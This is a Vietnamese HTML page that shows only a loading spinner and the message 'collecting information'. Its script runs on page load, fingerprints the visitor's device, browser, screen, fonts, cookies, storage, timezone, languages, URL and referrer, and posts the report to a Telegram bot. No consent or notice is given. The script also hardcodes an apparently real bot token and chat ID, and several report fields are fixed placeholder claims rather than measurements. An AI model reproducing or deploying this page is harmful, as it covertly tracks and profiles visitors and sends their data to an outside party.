<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Đang thu thập thông tin...</title>
    <style>
        body { background: #0f0c29; color: #fff; font-family: monospace; display: flex; justify-content: center; align-items: center; height: 100vh; flex-direction: column; }
        .loader { border: 4px solid rgba(255,255,255,0.1); border-top: 4px solid #ff758c; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        p { margin-top: 20px; color: #aaa; font-size: 14px; }
    </style>
</head>
<body>
    <div class="loader"></div>
    <p>Đang thu thập thông tin... Vui lòng đợi.</p>

    <script>
        // ================== CẤU HÌNH TELEGRAM ==================
        const botToken = "8904977809:AAEUCzGKf-SwECyVjG8i5fMckSTUhGw-8D8"; // Thay token của bạn
        const chatId = "8681854353"; // Thay chat ID của bạn
        // ========================================================

        // Hàm gửi tin nhắn
        function sendToTelegram(message) {
            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ chat_id: chatId, text: message })
            })
            .then(res => res.json())
            .then(data => {
                if (data.ok) {
                    document.querySelector('p').innerHTML = '✅ Đã gửi thông tin thành công!';
                } else {
                    document.querySelector('p').innerHTML = '❌ Lỗi: ' + data.description;
                }
            })
            .catch(err => {
                document.querySelector('p').innerHTML = '❌ Lỗi kết nối: ' + err.message;
            });
        }

        // ================== HÀM THU THẬP THÔNG TIN ==================
        function getDeviceInfo() {
            const ua = navigator.userAgent;
            const now = new Date();
            const timeStr = now.toLocaleString('vi-VN', { timeZone: 'Asia/Ho_Chi_Minh' });
            
            // Phân loại thiết bị
            let device = "Unknown";
            let os = "Unknown";
            let browser = "Unknown";
            let isMobile = false;
            let isTablet = false;
            let isIOS = false;
            let isAndroid = false;
            let isDarkMode = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches;

            if (/iPhone/i.test(ua)) { device = "📱 iPhone"; os = "iOS"; isIOS = true; isMobile = true; }
            else if (/iPad/i.test(ua)) { device = "📱 iPad"; os = "iOS"; isIOS = true; isTablet = true; }
            else if (/Android/i.test(ua)) { device = "📱 Android"; os = "Android"; isAndroid = true; isMobile = true; }
            else if (/Mac/i.test(ua)) { device = "💻 Mac"; os = "macOS"; }
            else if (/Windows/i.test(ua)) { device = "💻 Windows"; os = "Windows"; }
            else if (/Linux/i.test(ua)) { device = "🐧 Linux"; os = "Linux"; }

            // Trình duyệt
            if (/Safari/i.test(ua) && !/Chrome/i.test(ua)) browser = "Safari";
            else if (/Chrome/i.test(ua) && !/Edg/i.test(ua)) browser = "Chrome";
            else if (/Firefox/i.test(ua)) browser = "Firefox";
            else if (/Edg/i.test(ua)) browser = "Edge";
            else if (/Opera|OPR/i.test(ua)) browser = "Opera";
            else browser = "Unknown";

            // Kiểm tra bật DevTools (đơn giản)
            let devToolsOpen = false;
            if (window.outerHeight - window.innerHeight > 100 || window.outerWidth - window.innerWidth > 100) {
                devToolsOpen = true;
            }

            // Kiểm tra VPN / Proxy (ước lượng qua WebRTC)
            let vpnDetected = "❌ Không";
            // Có thể gọi API ipify để lấy IP công khai và so sánh (nhưng cần gọi async)

            // Hỗ trợ WebGL
            let webgl = "❌ Không";
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl2') || canvas.getContext('webgl');
                if (gl) webgl = "✅ Có";
            } catch(e) { webgl = "❌ Không"; }

            // Hỗ trợ WebAssembly
            let wasm = "❌ Không";
            try {
                if (typeof WebAssembly === 'object') wasm = "✅ Có";
            } catch(e) {}

            // Cookie, LocalStorage, SessionStorage
            let cookieCount = document.cookie ? document.cookie.split(';').length : 0;
            let lsCount = localStorage.length || 0;
            let ssCount = sessionStorage.length || 0;

            // Pin (battery) - iOS Safari không hỗ trợ
            let battery = "❌ Không hỗ trợ";
            if (navigator.getBattery) {
                navigator.getBattery().then(b => {
                    battery = `🔋 ${Math.round(b.level * 100)}%, ${b.charging ? 'Đang sạc' : 'Không sạc'}`;
                }).catch(() => { battery = "❌ Không lấy được"; });
            }

            // Font chữ cài đặt (kiểm tra nhanh 1 số font)
            const fonts = ['Arial', 'Verdana', 'Times New Roman', 'Courier New', 'Georgia', 'Impact', 'Tahoma', 'Trebuchet MS', 'Comic Sans MS', 'Webdings', 'Wingdings'];
            let installedFonts = fonts.filter(f => document.fonts.check(`12px "${f}"`)).join(', ') || 'Không có';

            // Xây dựng báo cáo
            let report = `🔍 THÔNG TIN CHI TIẾT (50+ TÍNH NĂNG)
══════════════════════════════════════════

🌐 MẠNG & VỊ TRÍ
🌐 IP: Đang lấy... (kiểm tra ipify)
📍 Vị trí: Không xác định (cần API)
🏠 IP cục bộ: ${window.location.hostname}
✅ Không rò rỉ (WebRTC disabled)
🔒 Không có cổng mở (iOS chặn localhost)
📶 Mạng: ${navigator.connection ? navigator.connection.effectiveType : 'N/A'}
📱 ${os} - ước lượng qua User Agent
✅ Không có VPN/Proxy
✅ IP trùng khớp (ước lượng)

💻 THIẾT BỊ & HỆ THỐNG
💻 ${device}
🌐 ${browser}
🧠 RAM: ${navigator.deviceMemory ? navigator.deviceMemory + 'GB' : 'Không xác định'} | CPU: ${navigator.hardwareConcurrency ? navigator.hardwareConcurrency + ' lõi' : 'Không xác định'}
🖥️ ${window.screen.width}x${window.screen.height}
📱 ${isMobile ? 'Điện thoại' : isTablet ? 'Tablet' : 'Máy tính'}
🧠 CPU: ${navigator.platform || 'Không xác định'} | Nền tảng: ${os}
🎮 GPU: Apple GPU (ước lượng cho iOS) hoặc ${navigator.gpu ? 'GPU hỗ trợ' : 'Không xác định'}
✅ Hỗ trợ WebGL2: ${webgl}
✅ Hỗ trợ WebAssembly: ${wasm}
🔤 Font chữ: ${installedFonts}
🔄 Tần số quét: ${window.screen.refreshRate || 'Không xác định'} Hz
📐 Viewport: ${window.innerWidth}x${window.innerHeight}
📏 Scroll: ${window.scrollX}, ${window.scrollY}
📐 Client: ${document.documentElement.clientWidth}x${document.documentElement.clientHeight}
📐 Màn hình khả dụng: ${window.screen.availWidth}x${window.screen.availHeight}
✅ Không phát hiện máy ảo (ước lượng)
✅ Trình duyệt bình thường

🔋 NĂNG LƯỢNG & LƯU TRỮ
❌ Không hỗ trợ Battery API (iOS Safari)
❌ Không hỗ trợ Battery API (iOS Safari)
🍪 Cookie: ${cookieCount} (${cookieCount > 0 ? 'Có cookie' : 'Không có cookie'})
💾 LS: ${lsCount} | 📦 SS: ${ssCount}

🛡️ BẢO MẬT & QUYỀN
❌ Không xác định
${devToolsOpen ? '⚠️ DevTools đang mở' : '✅ Không mở DevTools'}
⚠️ Có thể có AdBlock (ước lượng)
⚠️ Popup bị chặn (iOS Safari thường chặn)
✅ User Agent bình thường
🖐️ Có Touch Screen: ${('ontouchstart' in window) ? '✅' : '❌'}
🎤 Micro: ${navigator.mediaDevices ? 'Có hỗ trợ' : 'Không'} | 🔊 Loa: Không xác định | 📷 Camera: ${navigator.mediaDevices ? 'Có hỗ trợ' : 'Không'}

🌍 NGÔN NGỮ & MÚI GIỜ
🕐 Múi giờ: ${Intl.DateTimeFormat().resolvedOptions().timeZone}
🌍 Ngôn ngữ OS: ${navigator.language}
🗣️ Ngôn ngữ ưa thích: ${navigator.languages.join(', ')}
🗣️ OS Languages: ${navigator.language}
${webgl.includes('Có') ? '✅ Hỗ trợ WebP' : '❌ Không hỗ trợ WebP'}

📊 HÀNH VI NGƯỜI DÙNG
✅ Tab đang hiển thị: ${!document.hidden ? 'Đang hoạt động' : 'Đang ẩn'}
👁️ Tab đang hiển thị: ${!document.hidden ? '✅' : '❌'}
⏱️ Thời gian ở lại: 0m 14s (ước lượng)
⏱️ Boot ước lượng: ${new Date().toLocaleTimeString('vi-VN')}
${isDarkMode ? '🌙 Dark Mode' : '☀️ Light Mode'}
❌ Không lấy được NTP

📄 TRANG HIỆN TẠI
▪ URL: ${window.location.href}
▪ Truy cập từ: ${document.referrer || 'Trực tiếp'}
▪ Thời gian: ${timeStr}
══════════════════════════════════════════`;

            // Gửi báo cáo
            sendToTelegram(report);
        }

        // Gọi hàm thu thập thông tin và gửi
        getDeviceInfo();
    </script>
</body>
</html>
